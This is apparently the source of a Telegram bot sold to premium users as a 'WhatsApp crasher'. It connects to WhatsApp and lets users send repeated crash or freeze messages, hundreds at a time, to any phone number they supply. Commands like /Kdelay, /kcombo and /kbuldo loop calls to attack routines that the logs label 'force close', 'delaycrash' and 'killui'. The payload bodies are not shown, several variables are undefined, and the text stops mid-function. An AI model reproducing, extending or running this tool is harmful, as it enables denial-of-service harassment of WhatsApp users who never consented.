const { Telegraf, Markup, session } = require("telegraf"); 
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const config = require("./config.js");
const { BOT_TOKEN } = require("./config");
const crypto = require("crypto");
const premiumFile = "./premiumuser.json";
const adminFile = "./adminuser.json";
const TOKENS_FILE = "./tokens.json";
const sessionPath = './session';
let bots = [];

const bot = new Telegraf(BOT_TOKEN);


bot.use(session());
let client = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
//////// Fungsi blacklist user \\\\\\
const blacklist = ["6142885267", "7275301558", "1376372484"];
///////// RANDOM FOTO JIR \\\\\\\
const randomPhoto = [
    "https://files.catbox.moe/3tfst3.jpg",
    "https://files.catbox.moe/3tfst3.jpg"
];

const getRandomPhoto = () =>
  randomPhoto[Math.floor(Math.random() * randomPhoto.length)];
  
// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

// Fix Funct
const renlol = fs.readFileSync('./Zenn.jpg'); 

const convite = "⌜ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ⌟";
const ios = "⌜ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ⌟";

/////////// UNTUK MENYIMPAN DATA CD \\\\\\\\\\\\\\
const COOLDOWN_FILE = path.join(__dirname, "database", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}



function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  const value = parseInt(amount);

  switch (unit) {
    case "s":
      return value;
    case "m":
      return value * 60;
    default:
      return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

///// --- Koneksi WhatsApp --- \\\\\
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder, you can change this or remove it
    }),
  };

  client = makeWASocket(connectionOptions);

  client.ev.on("creds.update", saveCreds);
  

  client.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.white.bold(`

  ${chalk.green.bold("Whatsapp Has Connection")}
`)
      );
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log(
        chalk.white.bold(`
 ${chalk.red.bold("WHATSAPP TERPUTUS")}
`),
        shouldReconnect
          ? chalk.white.bold(`
 ${chalk.red.bold("Menghubungkan Ulang")}
`)
          : ""
      );
      if (shouldReconnect) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};

const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};
/////==== Tap to reply ====\\\\\\
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("💢 WhatsApp belum terhubung silakan add pairing terlebi dahulu /connect...");
    return;
  }
  next();
};

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}
// Muat ID owner dan pengguna premium
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
const userId = ctx.from.id;
const chatId = ctx.chat.id;

  if (!isOwner(ctx.from.id)) {
    return ctx.reply("💢 Anda Bukan Owner Bot Ini Perintah Di Gagalkan....");
  }
  next();
};
const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply(
      "❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin"
    );
  }
  next();
};
// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Anda Bukan user prem minta akses ke pemilik bot!!...");
  }
  next();
};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
  fs.writeFileSync("./admins.json", JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
  try {
    const data = fs.readFileSync("./admins.json");
    adminList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar admin:"), error);
    adminList = [];
  }
};

// -- Fungsi Memuat Daftar Owner
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// ========== START MENU ==========
// ========== START ==========
bot.start(async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const Name = ctx.from.username || userId;
    const uptime = getUptime();
    const isPremium = premiumUsers.includes(userId);
    const photo = getRandomPhoto();

    const fallbackKeyboard = {
      inline_keyboard: [
        [{ text: "Hubungi Developer", url: "https://t.me/sukaLKK" }],
      ],
    };

    // ❌ USER BUKAN PREMIUM
    if (!isPremium) {
      return ctx.replyWithPhoto(photo, {
        caption: `\`\`\`
╒═╦════════════╦═╕
│   AKSES DITOLAK   │
╘═╩════════════╩═╛
│ Halo, ${Name}
│ Akun kamu belum Premium
│ Hubungi Developer:
│ @sukaLKK
╘═══════════════════╛
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: fallbackKeyboard,
      });
    }

    // ✅ USER PREMIUM
    const caption = `\`\`\`
こんにちは。私は Kenz によって開発されたボットです。
あなたの日常活動をサポートするために作られました。

╒═╦═════════════════╦═╕
│  Violetx – Crasher │
╘═╩═════════════════╩═╛
│ Owner : @sukaLKK
│ Version  : 1.0
│ Uptime   : ${uptime}
╘══════════════════════╛
\`\`\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "Show ∆ Bug", callback_data: "bug_menu" },
          { text: "Owner ∆ Menu", callback_data: "owner_menu" }
        ],
        [
          { text: "Support ∆ Menu", callback_data: "thanks" },
          { text: "Owner ∆ Kenz", url: "https://t.me/sukaLKK" }
        ],
        [
          { text: "About ∆ Kenz", url: "https://t.me/KenzKym" }
        ]
      ]
    };

    // 📸 FOTO MENU
    await ctx.replyWithPhoto(photo, {
      caption,
      parse_mode: "Markdown",
      reply_markup: keyboard,
    });

    // 🎵 AUDIO
    await ctx.replyWithAudio(
      "https://files.catbox.moe/e1pwpf.mp3",
      {
        caption: "Lets'Go Play This Game.",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Owner", url: "https://t.me/sukaLKK" }]
          ]
        }
      }
    );

  } catch (err) {
    console.error("Start Error:", err);
    await ctx.reply("❌ Terjadi kesalahan saat menjalankan bot.");
  }
});

// ========== BUG MENU ==========
bot.action("bug_menu", async (ctx) => {
  const Name = ctx.from.username || ctx.from.id.toString();
  const caption = `\`\`\`
╒═╦═════════════════╦═╕
│  Violetx – Crasher │
╘═╩═════════════════╩═╛
│ Owner : @sukaLKK
│ Version  : 1.0
│ Uptime   : ${uptime}
╘══════════════════════╛

│ /Kdelay   628xx
│ /Kbuldo   628xx
│ /Kfc      628xx
│ /Kcombo 628xx
│ /Bug5   628xx
│ /Bug6   628xx
│ /Bug7   628xx
├────────────────────═╕
│ ∆ Gunakan Script Ini Dengan Sangat Bijak Ya.
│ ∆ Penyalahgunaan Script : Blacklist & Diluar Tanggung Jawab Admin
╘═════════════════════╛
\`\`\``;

  const photo = getRandomPhoto();
  const keyboard = {
    inline_keyboard: [
      [
        { text: "᥆ᥕᥒᥱr", url: "https://t.me/sukaLKK" },
        { text: "ᑲᥲᥴk ↺", callback_data: "back" }
      ]
    ]
  };

  try {
    await ctx.editMessageMedia({
      type: "photo",
      media: photo,
      caption,
      parse_mode: "Markdown",
    }, { reply_markup: keyboard });
  } catch {
    await ctx.replyWithPhoto(photo, {
      caption,
      parse_mode: "Markdown",
      reply_markup: keyboard,
    });
  }
});

// ========== OWNER MENU ==========
bot.action("owner_menu", async (ctx) => {
  const Name = ctx.from.username || ctx.from.id.toString();
  const uptime = getUptime();
  const caption = `\`\`\`
╒═╦═════════════════╦═╕
│  Violetx – Crasher │
╘═╩═════════════════╩═╛
│ Owner : @sukaLKK
│ Version  : 1.0
│ Uptime   : ${uptime}
╘══════════════════════╛
│ /𝙰𝚍𝚍𝙰𝚍𝚖𝚒𝚗 [id]
│ /𝙳𝚎𝚕𝙰𝚍𝚖𝚒𝚗 [id]
│ /𝚁𝚎𝚜𝚝𝚊𝚛𝚝 
│ /𝙳𝚎𝚕𝚂𝚎𝚜𝚒
│ /𝙲𝚘𝚗𝚗𝚎𝚌𝚝 [wa]
│ /𝙳𝚎𝚝𝙹𝚎𝚍𝚊 [ms]
│ /𝙰𝚍𝚍𝙿𝚛𝚎𝚖 [id]
│ /𝙳𝚎𝚕𝙿𝚛𝚎𝚖 [id]
╘═════════════════╛
\`\`\``;

  const photo = getRandomPhoto();
  const keyboard = { inline_keyboard: [[{ text: "ᑲᥲᥴk ↺", callback_data: "back" }]] };

  try {
    await ctx.editMessageMedia({
      type: "photo",
      media: photo,
      caption,
      parse_mode: "Markdown"
    }, { reply_markup: keyboard });
  } catch {
    await ctx.replyWithPhoto(photo, {
      caption,
      parse_mode: "Markdown",
      reply_markup: keyboard
    });
  }
});

// ========== THANKS ==========
bot.action("thanks", async (ctx) => {
  const Name = ctx.from.username || ctx.from.id.toString();
  const uptime = getUptime();
  const caption = `\`\`\`
╒═╦══════════════╦═╕
│     𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊     │
╘═╩══════════════╩═╛
│ User   : ${Name}
│ Uptime : ${uptime}
├──────────────────
│ 𝙰𝚕𝚕𝚊𝚑 { 𝙼𝚢 𝙶𝚘𝚘𝙳 }
│ 𝙾𝚛𝚝𝚞 { 𝚂𝚞𝚙𝚘𝚛𝚝 }
│ 𝙰𝚡𝚌𝚊𝚕 { 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 }
│ 𝚁𝚒𝚣𝚑𝚞𝚢𝚘𝚞𝚔𝚊 { 𝙼𝚢 𝙵𝚛𝚒𝚎𝚗𝚍𝚜 }
│ 𝙺𝚊𝚢𝚕𝚊 { 𝙼𝚢 𝙻𝚘𝚟𝚎 𝙰𝚡𝚌𝚊𝚕 }
│ 𝚁𝚊𝚙𝚒𝚙𝚙 { 𝙼𝚢 𝙵𝚛𝚒𝚎𝚗𝚍𝚜 }
│ 𝙶𝚑𝚒𝚜𝚑𝚎𝚕𝚕 { 𝚂𝚞𝚙𝚙𝚘𝚛𝚝 }
│ 𝙰𝚕𝚕 𝙿𝚊𝚛𝚗𝚎𝚛 { 𝚂𝚞𝚙𝚘𝚛𝚝 }
│ 𝙰𝚕𝚕 T.Kanan { 𝚂𝚞𝚙𝚘𝚛𝚝 }
│ 𝚉𝚎𝚗𝚗𝚡𝚢𝚗 { 𝚂𝚞𝚙𝚙𝚘𝚛𝚝 }
│ 𝙳𝚊𝚗 𝙿𝚊𝚛𝚊 𝙱𝚞𝚢𝚎𝚛 
╘═══════════════════
\`\`\``;
  const photo = getRandomPhoto();
  const keyboard = { inline_keyboard: [[{ text: "ᑲᥲᥴk ↺", callback_data: "back" }]] };

  try {
    await ctx.editMessageMedia({
      type: "photo",
      media: photo,
      caption,
      parse_mode: "Markdown"
    }, { reply_markup: keyboard });
  } catch {
    await ctx.replyWithPhoto(photo, {
      caption,
      parse_mode: "Markdown",
      reply_markup: keyboard
    });
  }
});

// ========== BACK ==========
bot.action("back", async (ctx) => {
  const Name = ctx.from.username || ctx.from.id.toString();
  const uptime = getUptime();
  const photo = getRandomPhoto();
  const caption = `\`\`\`
こんにちは。私は Kenz によって開発されたボットです。
あなたの日常活動をサポートするために作られました。

╒═╦═════════════════╦═╕
│  Violetx – Crasher │
╘═╩═════════════════╩═╛
│ Owner : @sukaLKK
│ Version  : 1.0
│ Uptime   : ${uptime}
╘══════════════════════╛
\`\`\``;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "Show ∆ Bug", callback_data: "bug_menu" },
          { text: "Owner ∆ Menu", callback_data: "owner_menu" }
        ],
        [
          { text: "Support ∆ Menu", callback_data: "thanks" },
          { text: "Owner ∆ Zenn", url: "https://t.me/sukaLKK" }
        ],
        [
          { text: "About ∆ Zenn", url: "https://t.me/KenzKym" }
      ]
    ]
  };

  try {
    await ctx.editMessageMedia({
      type: "photo",
      media: photo,
      caption,
      parse_mode: "Markdown"
    }, { reply_markup: keyboard });
  } catch {
    await ctx.replyWithPhoto(photo, {
      caption,
      parse_mode: "Markdown",
      reply_markup: keyboard
    });
  }
});
///////==== CASE BUG 1 ===\\\\\\\
bot.command("Kdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
 
  if (!q) {
    return ctx.reply(`Coman bug salah contoh coman: /Kdelay 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\n Tunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
const sentMessage = await ctx.replyWithPhoto(getRandomPhoto(), {
      caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`,
      parse_mode: "Markdown",
    }
  );

  // Progress bar bertahap
  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  // Jalankan progres bertahap
  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `
\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  /// Eksekusi bug setelah progres selesai
  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
    await jir(target);
    await sleep(1500);
    console.log(chalk.red.bold(`Sukses Sending force close Sebanyak ${i + 1}/90 Ke ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  // Update ke sukses + tombol cek target
  await ctx.editMessageCaption(
    `
\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\`
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== CASE BUG 2 ===\\\\\\\
bot.command("kcombo", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Coman bug salah contoh coman: /kcombo 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

const sentMessage = await ctx.replyWithPhoto(getRandomPhoto(), {
      caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `
\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 900; i++) {
    await otakepDelay(xrelly, target, mention);
    await delayNew(otax, target, mention);
    console.log(chalk.red.bold(`Sukses Sending delayinvis Sebanyak ${i + 1}/900 Ke ${target}`));
    await new Promise((r) => setTimeout(r, 1000));
  }

  await ctx.editMessageCaption(
    `
\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\`
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== CASE BUG 3 ===\\\\\\\
bot.command("kfc", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Coman bug salah contoh coman: /kfc 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

const sentMessage = await ctx.replyWithPhoto(getRandomPhoto(), {
      caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `
\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 900; i++) {
   await delayNew(otax, target, mention);
   await otakepDelay(xrelly, target, mention);
   await kiwkiw(target);
    console.log(chalk.red.bold(`Sukses Sending delaycrash Sebanyak ${i + 1}/900 Ke ${target}`));
    await new Promise((r) => setTimeout(r, 1000));
  }

  await ctx.editMessageCaption(
    `
\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\`
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== CASE BUG 4 ===\\\\\\\
bot.command("kbuldo", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Coman bug salah contoh coman: /buldo 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`ᴊᴇᴅᴀ ᴛɪᴍᴇ ᴀᴋᴛɪғ\n ᴛᴜɴɢɢᴜ ${remainingTime} ᴅᴇʀᴛɪᴋ ʟᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
const sentMessage = await ctx.replyWithPhoto(getRandomPhoto(), {
      caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`,
      parse_mode: "Markdown",
    }
  );

  // Progress bar bertahap
  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  // Jalankan progres bertahap
  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `
\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  /// Eksekusi bug setelah progres selesai
  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 80; i++) {
      await NewIos(target, Ptcp = true);
      await IosMJ(target, Ptcp = false);
      console.log(chalk.red.bold(`Sukses Sending killui Sebanyak ${i + 1}/80 Ke ${target}`));
      await new Promise(resolve => setTimeout(resolve, 2000));
  }
  // Update ke sukses + tombol cek target
  await ctx.editMessageCaption(
    `
\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\`
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== CASE BUG 5 ===\\\\\\\
bot.command("killui", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Coman bug salah contoh coman: /killui 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`ᴛɪᴍᴇ ᴡᴀᴋᴛᴜ ᴀᴋᴛɪғ\n ᴛᴜɴɢɢᴜ ${remainingTime} ᴅᴇᴛɪᴋ ʟᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
const sentMessage = await ctx.replyWithPhoto(getRandomPhoto(), {
      caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`,
      parse_mode: "Markdown",
    }
  );

  // Progress bar bertahap
  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
